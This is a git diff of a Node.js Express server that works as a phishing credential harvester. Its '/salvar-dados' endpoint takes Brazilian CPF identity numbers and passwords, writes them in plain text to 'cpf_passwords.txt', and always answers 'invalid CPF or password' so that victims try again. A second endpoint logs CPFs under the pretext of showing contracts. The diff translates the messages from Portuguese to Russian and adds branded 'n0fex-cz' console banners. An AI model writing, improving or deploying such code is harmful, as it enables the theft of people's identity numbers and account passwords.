@@ -10,7 +10,6 @@ const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';
 app.use(cors()); 
 app.use(express.json()); 
 
-
 app.use(express.static(path.join(__dirname, 'public')));
 
 app.post('/salvar-dados', (req, res) => {
@@ -18,51 +17,53 @@ app.post('/salvar-dados', (req, res) => {
     const { cpf, senha } = req.body;
 
     if (!cpf || !senha) {
-        return res.status(400).json({ message: "Dados incompletos." });
+        return res.status(400).json({ message: "Данные неполные." });
     }
 
-    const dataHora = new Date().toLocaleString('pt-BR');
-    const linhaDeLog = `[LOGIN - ${dataHora}] - CPF: ${cpf} | Senha: ${senha}\n`;
+    const dataHora = new Date().toLocaleString('ru-RU');
+    const linhaDeLog = `[ВХОД - ${dataHora}] - CPF: ${cpf} | Пароль: ${senha}\n`;
 
-    console.log('Dados recebidos:', linhaDeLog.trim());
+    console.log(`[n0fex://cz] :: ← получен пакет авторизации`);
+    console.log(`↳ ${linhaDeLog.trim()}`);
 
     fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
         if (err) {
-            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
-            return res.status(500).json({ message: 'Erro interno no servidor.' });
+            console.error(`[n0fex://cz] !! ошибка при записи в файл →`, err);
+            return res.status(500).json({ message: 'Внутренняя ошибка сервера.' });
         }
     });
 
-    
-    res.status(401).json({ message: 'CPF ou senha inválidos. Tente novamente.' });
+    res.status(401).json({ message: 'CPF или пароль неверны. Повторите попытку.' });
 });
 
 app.post('/acessar-contratos', (req, res) => {
     const { cpf } = req.body;
 
     if (!cpf) {
-        return res.status(400).json({ message: "CPF é obrigatório." });
+        return res.status(400).json({ message: "CPF обязателен." });
     }
 
-    const dataHora = new Date().toLocaleString('pt-BR');
-    const linhaDeLog = `[CONTRATOS - ${dataHora}] - CPF: ${cpf}\n`;
+    const dataHora = new Date().toLocaleString('ru-RU');
+    const linhaDeLog = `[КОНТРАКТЫ - ${dataHora}] - CPF: ${cpf}\n`;
 
-    console.log('Dados de Contratos recebidos:', linhaDeLog.trim());
+    console.log(`[n0fex://cz] :: ← получен запрос доступа к контрактам`);
+    console.log(`↳ ${linhaDeLog.trim()}`);
 
     fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
         if (err) {
-            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
-            return res.status(500).json({ message: 'Erro interno no servidor.' });
+            console.error(`[n0fex://cz] !! сбой при логировании контракта →`, err);
+            return res.status(500).json({ message: 'Внутренняя ошибка сервера.' });
         }
-        console.log('CPF de Contratos salvo com sucesso em', NOME_ARQUIVO_LOG);
+        console.log(`[n0fex://cz] ✓ контракт CPF зафиксирован → ${NOME_ARQUIVO_LOG}`);
     });
 
-    res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
+    res.status(200).json({ message: 'Доступ к контрактам... пожалуйста, подождите.' });
 });
 
-
 app.listen(port, () => {
-    console.log(`Сервер запущен успешно`);
-    console.log(`Поздравляю, вы подключены :) Создано n0fex-cz.norte_333`);
-    console.log(`Ожидание данных...`);
+    console.log(`╔═══════════════════════════════════════════╗`);
+    console.log(`║  ЗАПУСК УСПЕШЕН | n0fex-cz.norte_333      ║`);
+    console.log(`╚═══════════════════════════════════════════╝`);
+    console.log(`[n0fex://cz] > служба прослушивания активна на порту ${port}`);
+    console.log(`[n0fex://cz] > ожидание данных начато...`);
 });
